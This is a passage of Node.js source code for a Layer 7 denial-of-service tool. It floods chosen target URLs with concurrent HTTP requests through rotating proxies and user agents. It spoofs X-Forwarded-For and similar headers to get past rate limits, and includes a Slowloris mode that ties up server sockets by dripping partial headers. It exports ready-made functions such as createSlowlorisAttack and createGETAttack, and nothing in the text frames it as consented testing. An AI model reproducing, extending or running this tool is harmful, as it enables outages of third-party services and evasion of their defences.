        this.persistentConnections = options.persistentConnections || false;
        this.connectionTimeout = options.connectionTimeout || 5000;
        this.tlsOptions = options.tlsOptions || {};
        this.requestRampUpTime = options.requestRampUpTime || 0;
        this.browserSim = options.browserSim || false; // Simulate browser behavior
    }

    parseTargets(targets) {
        if (typeof targets === 'string') {
            // Single target
            return [this.parseTarget(targets)];
        } else if (Array.isArray(targets)) {
            // Multiple targets
            return targets.map(target => this.parseTarget(target));
        } else {
            throw new Error('Targets must be a string or array of strings');
        }
    }

    parseTarget(target) {
        if (typeof target === 'string') {
            return {
                target: target,
                id: crypto.createHash('md5').update(target).digest('hex').substring(0, 8),
                weight: 1, // Equal weight by default
                priority: 1, // Equal priority by default
                customConfig: {}
            };
        } else if (typeof target === 'object') {
            return {
                target: target.target,
                id: target.id || crypto.createHash('md5').update(target.target).digest('hex').substring(0, 8),
                weight: target.weight || 1,
                priority: target.priority || 1,
                customConfig: target.config || {}
            };
        } else {
            throw new Error('Invalid target format');
        }
    }

    getDefaultUserAgents() {
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1'
        ];
    }

    validate() {
        if (!this.targets || this.targets.length === 0) {
            throw new Error('At least one target is required');
        }

        this.targets.forEach((target, index) => {
            if (!target.target) {
                throw new Error(`Target ${index} is missing target URL`);
            }
        });

        const validMethods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'SLOW'];
        if (!validMethods.includes(this.method)) {
            throw new Error(`Invalid method for LAYER7: ${this.method}. Must be one of: ${validMethods.join(', ')}`);
        }

        if (this.duration <= 0) throw new Error('Duration must be positive');
        if (this.threadsPerTarget <= 0) throw new Error('Threads per target must be positive');

        return true;
    }

    getTargetConfig(targetId) {
        const target = this.targets.find(t => t.id === targetId);
        return target ? {
            ...this,
            target: target.target,
            weight: target.weight,
            priority: target.priority,
            customConfig: target.customConfig
        } : null;
    }
}

// Layer 7 Attack
class Layer7Attack extends EventEmitter {
    constructor(config) {
        super();
        this.config = new Layer7Config(config);
        this.config.validate();
        
        this.resourceManager = GlobalResourceManager.getInstance();
        this.stats = new MultiTargetStats();
        this.proxyManager = new ProxyManager();
        this.threadingManager = new ThreadingManager();
        
        this.attackId = crypto.randomUUID().substring(0, 8);
        this.targetAttacks = new Map();
        this.isRunning = false;
        this.shouldStop = false;
        this.resolvedTargets = new Map();
        this.activeConnections = new Map();
        
        if (this.config.useProxies && this.config.proxyList.length > 0) {
            this.proxyManager.loadProxies(this.config.proxyList);
        }
        
        // Setup event forwarding
        this.stats.on('target-stats-updated', (data) => {
            this.emit('target-progress', data);
        });
        
        this.stats.on('global-stats-updated', (data) => {
            this.emit('global-progress', data);
        });
    }

    async start() {
        if (this.isRunning) {
            throw new Error('Attack is already running');
        }

        this.isRunning = true;
        this.shouldStop = false;
        
        logger.info(`Starting Layer 7 attack ${this.attackId}`, this.attackId);
        logger.info(`Targets: ${this.config.targets.length}, Method: ${this.config.method}`, this.attackId);
        
        try {
            // Register with global resource manager
            this.resourceManager.registerAttack(this.attackId, this);
            
            // Check resource availability
            const totalThreadsNeeded = this.config.targets.length * this.config.threadsPerTarget;
            const resourceCheck = this.resourceManager.canAllocateResources(
                totalThreadsNeeded, 
                this.config.targets.length * 100 // Rough connection estimate
            );
            
            if (!resourceCheck.canProceed) {
                const reasons = Object.entries(resourceCheck.reasons)
                    .filter(([key, value]) => !value)
                    .map(([key]) => key);
                throw new Error(`Insufficient resources: ${reasons.join(', ')}`);
            }
            
            // Resolve all targets
            logger.info('Resolving targets...', this.attackId);
            this.resolvedTargets = await AdvancedUtils.resolveTargets(this.config.targets);
            
            // Initialize statistics for each target
            this.config.targets.forEach(target => {
                this.stats.initializeTarget(target.id, target);
            });
            
            // Start real-time monitoring
            this.stats.startRealTimeMonitoring();
            
            // Initialize threading if needed
            if (this.config.threadsPerTarget > 50) {
                await this.threadingManager.initializeWorkerPool();
            }
            
            // Execute attack based on coordination strategy
            if (this.config.coordinateTargets) {
                await this.executeCoordinatedAttack();
            } else {
                await this.executeParallelAttack();
            }
            
        } catch (error) {
            logger.error(`Layer 7 attack failed: ${error.message}`, this.attackId);
            throw error;
        } finally {
            await this.cleanup();
        }

        const globalReport = this.stats.getGlobalSummary();
        this.stats.finalize();
        
        logger.success(`Layer 7 attack ${this.attackId} completed`, this.attackId);
        this.printSummaryReport(globalReport);
        
        return globalReport;
    }

    async executeCoordinatedAttack() {
        logger.info('Executing coordinated Layer 7 attack', this.attackId);
        
        // Sort targets by priority
        const sortedTargets = [...this.config.targets].sort((a, b) => b.priority - a.priority);
        
        if (this.config.rampUpTime > 0) {
            await this.executeRampUpCoordinated(sortedTargets);
        } else {
            await this.executeFullScaleCoordinated(sortedTargets);
        }
    }

    async executeRampUpCoordinated(sortedTargets) {
        const rampUpSteps = Math.min(10, sortedTargets.length);
        const stepInterval = this.config.rampUpTime * 1000 / rampUpSteps;
        const targetsPerStep = Math.ceil(sortedTargets.length / rampUpSteps);
        
        for (let step = 0; step < rampUpSteps && !this.shouldStop; step++) {
            const stepTargets = sortedTargets.slice(step * targetsPerStep, (step + 1) * targetsPerStep);
            
            logger.info(`Ramp-up step ${step + 1}/${rampUpSteps}: Starting ${stepTargets.length} targets`, this.attackId);
            
            // Start targets in this step
            const stepPromises = stepTargets.map(target => this.startTargetAttack(target));
            
            // Don't await - let them run concurrently
            Promise.allSettled(stepPromises);
            
            if (step < rampUpSteps - 1 && !this.shouldStop) {
                await AdvancedUtils.sleep(stepInterval);
            }
        }
        
        // Wait for attack duration
        const remainingTime = this.config.duration * 1000;
        await AdvancedUtils.sleep(remainingTime);
        
        this.shouldStop = true;
    }

    async executeFullScaleCoordinated(sortedTargets) {
        logger.info('Starting all targets simultaneously', this.attackId);
        
        const attackPromises = [];
        
        for (const target of sortedTargets) {
            if (this.shouldStop) break;
            
            attackPromises.push(this.startTargetAttack(target));
            
            // Delay between target starts if configured
            if (this.config.targetDelay > 0 && !this.shouldStop) {
                await AdvancedUtils.sleep(this.config.targetDelay);
            }
        }
        
        // Wait for attack duration or until stopped
        const timeoutPromise = AdvancedUtils.sleep(this.config.duration * 1000)
            .then(() => { this.shouldStop = true; });

        await Promise.race([
            Promise.allSettled(attackPromises),
            timeoutPromise
        ]);
        
        this.shouldStop = true;
    }

    async executeParallelAttack() {
        logger.info('Executing parallel Layer 7 attack', this.attackId);
        
        // Start all targets simultaneously without coordination
        const attackPromises = this.config.targets.map(target => this.startTargetAttack(target));
        
        // Wait for attack duration
        const timeoutPromise = AdvancedUtils.sleep(this.config.duration * 1000)
            .then(() => { this.shouldStop = true; });

        await Promise.race([
            Promise.allSettled(attackPromises),
            timeoutPromise
        ]);
        
        this.shouldStop = true;
    }

    async startTargetAttack(target) {
        const targetInfo = this.resolvedTargets.get(target.id);
        if (!targetInfo) {
            logger.error(`Failed to resolve target ${target.target}`, this.attackId, target.id);
            return;
        }

        logger.info(`Starting attack on ${target.target} (${targetInfo.ip}:${targetInfo.port})`, this.attackId, target.id);
        
        // Calculate threads for this target based on weight and available resources
        const baseThreads = this.config.threadsPerTarget;
        const weightedThreads = Math.round(baseThreads * target.weight);
        const allocatedConnections = this.resourceManager.allocateConnections(weightedThreads * 2, this.attackId);
        const actualThreads = Math.min(weightedThreads, Math.floor(allocatedConnections / 2));
        
        if (actualThreads <= 0) {
            logger.warn(`No resources available for target ${target.target}`, this.attackId, target.id);
            return;
        }
        
        logger.debug(`Allocated ${actualThreads} threads for ${target.target}`, this.attackId, target.id);
        
        // Create target-specific attack configuration
        const targetConfig = {
            ...this.config,
            target: target.target,
            threads: actualThreads,
            targetId: target.id,
            customConfig: target.customConfig
        };
        
        // Start attack threads for this target
        const threadPromises = Array.from(
            { length: actualThreads }, 
            (_, threadIndex) => this.runTargetThread(targetInfo, targetConfig, threadIndex)
        );

        await Promise.allSettled(threadPromises);
        
        // Release allocated connections
        this.resourceManager.releaseConnections(allocatedConnections, this.attackId);
        
        logger.info(`Completed attack on ${target.target}`, this.attackId, target.id);
        this.stats.finalizeTarget(target.id);
    }

    async runTargetThread(targetInfo, targetConfig, threadIndex) {
        const threadId = `${targetConfig.targetId}-${threadIndex}`;
        let requestCount = 0;
        
        // Configure thread specific options
        const isHttps = targetInfo.protocol === 'https:';
        const method = targetConfig.method;
        
        // Create agent for connection reuse if needed
        const agent = targetConfig.persistentConnections ? 
            (isHttps ? new https.Agent({ keepAlive: true, maxSockets: 1 }) : 
                     new http.Agent({ keepAlive: true, maxSockets: 1 })) : 
            null;
        
        while (!this.shouldStop) {
            try {
                // Get proxy if using proxies
                let proxy = null;
                if (targetConfig.useProxies) {
                    proxy = this.proxyManager.getNextProxy();
                }
                
                // Execute attack request based on method
                if (method === 'SLOW') {
                    await this.executeSlowRequest(targetInfo, targetConfig, threadId, proxy);
                } else {
                    await this.executeHttpRequest(targetInfo, targetConfig, threadId, proxy, agent);
                }
                
                requestCount++;
                
                // Apply rate limiting if configured
                if (targetConfig.requestRate > 0) {
                    const delay = 1000 / targetConfig.requestRate;
                    await AdvancedUtils.sleep(delay);
                }
                
                // Check request limit if set
                if (targetConfig.requestsPerThread > 0 && requestCount >= targetConfig.requestsPerThread) {
                    logger.debug(`Thread ${threadId} reached request limit of ${targetConfig.requestsPerThread}`, this.attackId, targetConfig.targetId);
                    break;
                }
            } catch (error) {
                this.stats.updateTargetStats(targetConfig.targetId, {
                    requests: 1,
                    failed: 1,
                    errors: 1,
                    errorType: error.name || 'UnknownError'
                });
                
                if (proxy) {
                    this.proxyManager.markProxyFailed(proxy, error.message);
                }
                
                logger.debug(`Thread ${threadId} error: ${error.message}`, this.attackId, targetConfig.targetId);
                await AdvancedUtils.sleep(100); // Backoff on error
            }
        }
        
        logger.debug(`Thread ${threadId} completed with ${requestCount} requests`, this.attackId, targetConfig.targetId);
    }

    async executeHttpRequest(targetInfo, targetConfig, threadId, proxy = null, agent = null) {
        const isHttps = targetInfo.protocol === 'https:';
        const requestModule = isHttps ? https : http;
        
        // Prepare request options
        const options = {
            hostname: targetInfo.ip || targetInfo.hostname,
            port: targetInfo.port,
            path: targetInfo.path,
            method: targetConfig.method,
            headers: {},
            timeout: targetConfig.globalTimeout,
            agent: agent
        };

        // Add TLS options for HTTPS
        if (isHttps && targetConfig.tlsOptions) {
            Object.assign(options, targetConfig.tlsOptions);
        }

        // Add User-Agent
        options.headers['User-Agent'] = AdvancedUtils.getRandomUserAgent(targetConfig.userAgents);
        
        // Add Host header with original hostname
        options.headers['Host'] = targetInfo.hostname;
        
        // Add common headers
        options.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
        options.headers['Accept-Language'] = 'en-US,en;q=0.5';
        options.headers['Accept-Encoding'] = 'gzip, deflate';
        options.headers['Cache-Control'] = 'no-cache';
        options.headers['Connection'] = targetConfig.keepAlive ? 'keep-alive' : 'close';
        
        // Add rate limit bypass headers
        if (targetConfig.rateLimitBypass) {
            options.headers['X-Forwarded-For'] = AdvancedUtils.randomIP();
            options.headers['X-Real-IP'] = AdvancedUtils.randomIP();
            options.headers['X-Originating-IP'] = AdvancedUtils.randomIP();
            options.headers['X-Remote-IP'] = AdvancedUtils.randomIP();
            options.headers['X-Remote-Addr'] = AdvancedUtils.randomIP();
        }

        // Add cookies if provided
        if (targetConfig.cookies && targetConfig.cookies.length > 0) {
            options.headers['Cookie'] = targetConfig.cookies.join('; ');
        }

        // Add custom headers if provided
        if (targetConfig.headers && Object.keys(targetConfig.headers).length > 0) {
            Object.entries(targetConfig.headers).forEach(([key, value]) => {
                options.headers[key] = value;
            });
        }

        // Prepare request body for POST/PUT methods
        let reqBody = null;
        
        if (['POST', 'PUT'].includes(targetConfig.method)) {
            if (targetConfig.formData) {
                // Form data
                const formParts = [];
                Object.entries(targetConfig.formData).forEach(([key, value]) => {
                    formParts.push(`${encodeURIComponent(key)}=${encodeURIComponent(value)}`);
                });
                reqBody = formParts.join('&');
                options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            } else if (targetConfig.postData) {
                // JSON data
                reqBody = typeof targetConfig.postData === 'string' ? 
                    targetConfig.postData : JSON.stringify(targetConfig.postData);
                options.headers['Content-Type'] = 'application/json';
            } else {
                // Random data
                reqBody = targetConfig.randomizePayload ? 
                    AdvancedUtils.randomString(targetConfig.payloadSize || 256) : 
                    'A'.repeat(targetConfig.payloadSize || 256);
                options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            }
            
            options.headers['Content-Length'] = Buffer.byteLength(reqBody);
        }

        // Setup proxy if provided
        if (proxy) {
            options.host = proxy.host;
            options.port = proxy.port;
            options.path = `${targetInfo.protocol}//${targetInfo.hostname}:${targetInfo.port}${targetInfo.path}`;
            
            if (proxy.username && proxy.password) {
                const auth = Buffer.from(`${proxy.username}:${proxy.password}`).toString('base64');
                options.headers['Proxy-Authorization'] = `Basic ${auth}`;
            }
        }

        const startTime = performance.now();
        
        return new Promise((resolve, reject) => {
            // Track this connection
            const connectionId = crypto.randomUUID().substring(0, 8);
            
            // Create the request
            const req = requestModule.request(options, (res) => {
                let responseSize = 0;
                let data = [];
                
                // Handle redirection if enabled
                if (targetConfig.followRedirects && (res.statusCode === 301 || res.statusCode === 302) && res.headers.location) {
                    req.destroy();
                    
                    // Remove from active connections
                    this.activeConnections.delete(connectionId);
                    
                    // Follow the redirect
                    const redirectUrl = url.resolve(
                        `${targetInfo.protocol}//${targetInfo.hostname}:${targetInfo.port}`, 
                        res.headers.location
                    );
                    
                    logger.debug(`Following redirect to ${redirectUrl}`, this.attackId, targetConfig.targetId);
                    
                    // Create new target config with the redirect URL
                    const redirectTarget = {
                        ...targetConfig,
                        target: redirectUrl
                    };
                    
                    // Resolve the redirect target
                    const normalizedTarget = AdvancedUtils.normalizeTarget(redirectUrl);
                    
                    // Execute the redirected request
                    this.executeHttpRequest(normalizedTarget, redirectTarget, threadId, proxy, agent)
                        .then(resolve)
                        .catch(reject);
                    
                    return;
                }
                
                // Handle response data
                res.on('data', (chunk) => {
                    responseSize += chunk.length;
                    
                    // Only store data if browser simulation is enabled
                    if (targetConfig.browserSim) {
                        data.push(chunk);
                    }
                });
                
                res.on('end', () => {
                    const responseTime = performance.now() - startTime;
                    
                    // Update stats
                    this.stats.updateTargetStats(targetConfig.targetId, {
                        requests: 1,
                        successful: 1,
                        bytes: responseSize,
                        responseTime: responseTime,
                        bandwidth: responseSize / (responseTime / 1000),
                        statusCode: res.statusCode
                    });
                    
                    if (proxy) {
                        this.proxyManager.markProxyWorking(proxy, responseTime);
                    }
                    
                    // Remove from active connections
                    this.activeConnections.delete(connectionId);
                    
                    // Browser simulation - parse links and resources
                    if (targetConfig.browserSim && data.length > 0) {
                        const responseBody = Buffer.concat(data).toString();
                        this.processBrowserSimResponse(responseBody, targetInfo, targetConfig);
                    }
                    
                    resolve({
                        statusCode: res.statusCode,
                        headers: res.headers,
                        responseSize,
                        responseTime
                    });
                });
            });
            
            // Set up timeout
            req.setTimeout(targetConfig.connectionTimeout, () => {
                req.destroy(new Error('Connection timeout'));
            });
            
            // Error handling
            req.on('error', (error) => {
                this.activeConnections.delete(connectionId);
                reject(error);
            });
            
            // Track this connection
            this.activeConnections.set(connectionId, {
                req,
                targetId: targetConfig.targetId,
                threadId,
                startTime: Date.now()
            });
            
            // Send request body if needed
            if (reqBody) {
                req.write(reqBody);
            }
            
            // Finish the request
            req.end();
        });
    }

    async executeSlowRequest(targetInfo, targetConfig, threadId, proxy = null) {
        // Slow attack - keep connection alive but send data very slowly
        const isHttps = targetInfo.protocol === 'https:';
        const socket = new net.Socket();
        
        return new Promise((resolve, reject) => {
            const connectionId = crypto.randomUUID().substring(0, 8);
            let connected = false;
            
            // Set timeout
            socket.setTimeout(targetConfig.connectionTimeout);
            
            // Error handlers
            socket.on('timeout', () => {
                socket.destroy();
                this.activeConnections.delete(connectionId);
                reject(new Error('Connection timeout'));
            });
            
            socket.on('error', (err) => {
                this.activeConnections.delete(connectionId);
                reject(err);
            });
            
            socket.on('close', () => {
                this.activeConnections.delete(connectionId);
                if (connected) {
                    resolve(); // Successfully completed the slow attack
                }
            });
            
            // Connection handler
            socket.on('connect', async () => {
                connected = true;
                
                if (proxy) {
                    this.proxyManager.markProxyWorking(proxy);
                }
                
                try {
                    // Initial headers
                    const initialHeaders = [
                        `GET ${targetInfo.path} HTTP/1.1`,
                        `Host: ${targetInfo.hostname}`,
                        `User-Agent: ${AdvancedUtils.getRandomUserAgent(targetConfig.userAgents)}`,
                        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
                        `Connection: keep-alive`,
                        `Cache-Control: no-cache`
                    ].join('\r\n') + '\r\n';
                    
                    socket.write(initialHeaders);
                    
                    // Track stats for the initial request
                    this.stats.updateTargetStats(targetConfig.targetId, {
                        requests: 1,
                        successful: 1,
                        bytes: initialHeaders.length,
                        bandwidth: initialHeaders.length
                    });
                    
                    // Slow drip of headers to keep connection alive
                    let headerIndex = 0;
                    const extraHeaders = [
                        'X-a: b',
                        'X-c: d',
                        'X-e: f',
                        'X-g: h',
                        'X-i: j',
                        'Cookie: a=b',
                        'Accept-Language: en-US,en;q=0.9',
                        'X-Requested-With: XMLHttpRequest'
                    ];
                    
                    while (connected && !this.shouldStop) {
                        if (headerIndex < extraHeaders.length) {
                            const header = extraHeaders[headerIndex] + '\r\n';
                            socket.write(header);
                            
                            // Track stats
                            this.stats.updateTargetStats(targetConfig.targetId, {
                                bytes: header.length,
                                bandwidth: header.length
                            });
                            
                            headerIndex++;
                        } else {
                            // Keep connection alive with partial header
                            const partialHeader = 'X-' + AdvancedUtils.randomString(5) + ': ';
                            socket.write(partialHeader);
                            
                            // Track stats
                            this.stats.updateTargetStats(targetConfig.targetId, {
                                bytes: partialHeader.length,
                                bandwidth: partialHeader.length
                            });
                        }
                        
                        // Wait based on slow request rate
                        const delay = 1000 / targetConfig.slowRequestsRate;
                        await AdvancedUtils.sleep(delay);
                    }
                    
                } catch (error) {
                    socket.destroy();
                    reject(error);
                }
            });
            
            // Track this connection
            this.activeConnections.set(connectionId, {
                socket,
                targetId: targetConfig.targetId,
                threadId,
                startTime: Date.now()
            });
            
            // Connect to proxy or target
            if (proxy) {
                socket.connect(proxy.port, proxy.host);
            } else {
                const host = targetInfo.ip || targetInfo.hostname;
                socket.connect(targetInfo.port, host);
            }
        });
    }

    processBrowserSimResponse(responseBody, targetInfo, targetConfig) {
        try {
            // Extract URLs from response (simple regex for demonstration)
            const urlRegex = /href=["'](.*?)["']/g;
            const scriptRegex = /src=["'](.*?)["']/g;
            const imageRegex = /src=["'](.*?)["']/g;
            
            const extractedUrls = [];
            let match;
            
            // Extract all URLs
            while ((match = urlRegex.exec(responseBody)) !== null) {
                extractedUrls.push(match[1]);
            }
            
            // Extract script sources
            while ((match = scriptRegex.exec(responseBody)) !== null) {
                extractedUrls.push(match[1]);
            }
            
            // Extract image sources
            while ((match = imageRegex.exec(responseBody)) !== null) {
                extractedUrls.push(match[1]);
            }
            
            // Filter and normalize URLs
            const normalizedUrls = extractedUrls
                .filter(u => u && !u.startsWith('javascript:') && !u.startsWith('#'))
                .map(u => url.resolve(`${targetInfo.protocol}//${targetInfo.hostname}:${targetInfo.port}`, u));
            
            // Limit secondary requests
            const maxSecondaryRequests = 5;
            const selectedUrls = normalizedUrls.slice(0, maxSecondaryRequests);
            
            logger.debug(`Browser sim: found ${normalizedUrls.length} URLs, requesting ${selectedUrls.length}`, this.attackId, targetConfig.targetId);
            
            // Request secondary resources asynchronously
            selectedUrls.forEach(resourceUrl => {
                const resourceTarget = AdvancedUtils.normalizeTarget(resourceUrl);
                
                // Create a simplified config for resource requests
                const resourceConfig = {
                    ...targetConfig,
                    method: 'GET',
                    browserSim: false, // Prevent recursive loading
                    followRedirects: false // Don't follow redirects for secondary resources
                };
                
                // Make the request without awaiting (fire and forget)
                this.executeHttpRequest(resourceTarget, resourceConfig, 'browser-sim')
                    .catch(err => {
                        logger.debug(`Browser sim resource error: ${err.message}`, this.attackId, targetConfig.targetId);
                    });
            });
        } catch (error) {
            logger.debug(`Browser sim processing error: ${error.message}`, this.attackId, targetConfig.targetId);
        }
    }

    async stop() {
        logger.info(`Stopping Layer 7 attack ${this.attackId}`, this.attackId);
        this.shouldStop = true;
        await this.cleanup();
    }

    async cleanup() {
        this.isRunning = false;
        
        // Close all active connections
        for (const connection of this.activeConnections.values()) {
            try {
                if (connection.req && !connection.req.destroyed) {
                    connection.req.destroy();
                }
                if (connection.socket && !connection.socket.destroyed) {
                    connection.socket.destroy();
                }
            } catch (error) {
                logger.debug(`Error closing connection: ${error.message}`, this.attackId);
            }
        }
        
        this.activeConnections.clear();
        
        // Stop stats monitoring
        this.stats.stopRealTimeMonitoring();
        
        // Shutdown threading manager
        await this.threadingManager.shutdown();
        
        // Unregister from global resource manager
        this.resourceManager.unregisterAttack(this.attackId);
        
        // Clear target attacks
        this.targetAttacks.clear();
        
        logger.debug(`Cleanup completed for attack ${this.attackId}`, this.attackId);
    }

    printSummaryReport(globalReport) {
        console.log(`\n${Colors.CYAN}${Colors.BOLD}=== LAYER 7 ATTACK SUMMARY ===${Colors.RESET}`);
        console.log(`${Colors.WHITE}Attack ID: ${Colors.GREEN}${this.attackId}${Colors.RESET}`);
        console.log(`${Colors.WHITE}Method: ${Colors.GREEN}${this.config.method}${Colors.RESET}`);
        console.log(`${Colors.WHITE}Total Targets: ${Colors.GREEN}${globalReport.totalTargets}${Colors.RESET}`);
        console.log(`${Colors.WHITE}Duration: ${Colors.GREEN}${globalReport.duration} seconds${Colors.RESET}`);
        console.log(`${Colors.WHITE}Total Requests: ${Colors.GREEN}${globalReport.totalRequests}${Colors.RESET}`);
        console.log(`${Colors.WHITE}Average RPS: ${Colors.GREEN}${globalReport.averageRequestsPerSecond}${Colors.RESET}`);
        console.log(`${Colors.WHITE}Total Bandwidth: ${Colors.GREEN}${globalReport.currentTotalBandwidthFormatted}${Colors.RESET}`);
        console.log(`${Colors.WHITE}Total Data Sent: ${Colors.GREEN}${globalReport.totalBytesFormatted}${Colors.RESET}`);
        
        if (globalReport.totalErrors > 0) {
            console.log(`${Colors.YELLOW}Total Errors: ${globalReport.totalErrors}${Colors.RESET}`);
        }
        
        console.log(`\n${Colors.CYAN}Target Details:${Colors.RESET}`);
        globalReport.targets.forEach(target => {
            const status = target.isActive ? `${Colors.GREEN}ACTIVE${Colors.RESET}` : `${Colors.GRAY}COMPLETED${Colors.RESET}`;
            console.log(`  ${Colors.WHITE}${target.target}: ${status} - ${target.requestsPerSecond} RPS, ${target.successRate}% success${Colors.RESET}`);
            
            if (target.statusCodes && Object.keys(target.statusCodes).length > 0) {
                const statusCodes = Object.entries(target.statusCodes)
                    .map(([code, count]) => `${code}: ${count}`)
                    .join(', ');
                console.log(`    ${Colors.GRAY}Status Codes: ${statusCodes}${Colors.RESET}`);
            }
        });
        
        if (this.config.useProxies) {
            const proxyStats = this.proxyManager.getStats();
            console.log(`\n${Colors.CYAN}Proxy Statistics:${Colors.RESET}`);
            console.log(`  ${Colors.WHITE}Total Proxies: ${Colors.GREEN}${proxyStats.total}${Colors.RESET}`);
            console.log(`  ${Colors.WHITE}Working: ${Colors.GREEN}${proxyStats.working}${Colors.RESET}`);
            console.log(`  ${Colors.WHITE}Failed: ${Colors.RED}${proxyStats.failed}${Colors.RESET}`);
        }
        
        console.log(`${Colors.CYAN}${Colors.BOLD}=======================================\n${Colors.RESET}`);
    }

    getAttackStats() {
        return {
            attackId: this.attackId,
            method: this.config.method,
            layer: 'LAYER7',
            isRunning: this.isRunning,
            globalStats: this.stats.getGlobalSummary(),
            proxyStats: this.config.useProxies ? this.proxyManager.getStats() : null,
            threadingStats: this.threadingManager.getWorkerStats(),
            activeConnections: this.activeConnections.size
        };
    }
}

// Helper methods for Layer 7 specific functionality
function createHTTPAttack(targets, method, duration, options = {}) {
    const config = {
        targets,
        method,
        layer: 'LAYER7',
        duration,
        ...options
    };
    
    return new Layer7Attack(config);
}

function createSlowlorisAttack(targets, duration, options = {}) {
    const config = {
        targets,
        method: 'SLOW',
        layer: 'LAYER7',
        duration,
        persistentConnections: true,
        slowRequestsRate: options.slowRequestsRate || 10,
        ...options
    };
    
    return new Layer7Attack(config);
}

// Create and initialize global logger
const logger = new Logger('LAYER7');
const globalResourceManager = GlobalResourceManager.getInstance();

// Export Layer 7 specific functionality
module.exports = {
    // Main attack classes
    Layer7Attack,
    Layer7Config,
    
    // Helper functions
    createHTTPAttack,
    createSlowlorisAttack,
    
    // Common HTTP methods
    createGETAttack: (targets, duration, options = {}) => createHTTPAttack(targets, 'GET', duration, options),
    createPOSTAttack: (targets, duration, options = {}) => createHTTPAttack(targets, 'POST', duration, options),
    createHEADAttack: (targets, duration, options = {}) => createHTTPAttack(targets, 'HEAD', duration, options),
    
    // Utility functions
    generateHttpPayload: AdvancedUtils.createHTTPPayload,
    
    // Shared resources
    logger,
    globalResourceManager
};